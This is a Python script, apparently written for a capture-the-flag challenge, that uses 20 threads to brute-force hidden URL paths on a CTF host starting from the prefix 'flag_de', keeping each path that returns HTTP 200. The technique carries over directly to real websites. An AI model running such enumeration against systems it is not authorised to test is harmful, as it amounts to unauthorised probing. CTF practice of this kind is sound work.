import requests
import string
from concurrent.futures import ThreadPoolExecutor

BASE_URL = "https://bonitoblog.ctf.zone/"
CHARS = string.ascii_lowercase + string.digits
MAX_WORKERS = 20
TIMEOUT = 3

session = requests.Session()

def is_valid(path):
    try:
        r = session.get(BASE_URL + path, allow_redirects=False, timeout=TIMEOUT)
        return r.status_code == 200
    except requests.RequestException:
        return False

def brute_level(prefix):
    valid_prefixes = []
    futures = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for c in CHARS:
            futures.append(executor.submit(check_and_collect, prefix + c, valid_prefixes))
    for _ in futures:
        pass
    return valid_prefixes

def check_and_collect(candidate, valid_list):
    if is_valid(candidate):
        print(f"[VALID] {candidate}")
        valid_list.append(candidate)

def deep_search(start_prefix):
    stack = [start_prefix]
    while stack:
        prefix = stack.pop()
        new_valids = brute_level(prefix)
        stack.extend(new_valids)

if __name__ == "__main__":
    start = "flag_de"  # got _ prefix from scanning using gobuster before :3 i thinks it will be { but not
    if is_valid(start):
        deep_search(start)
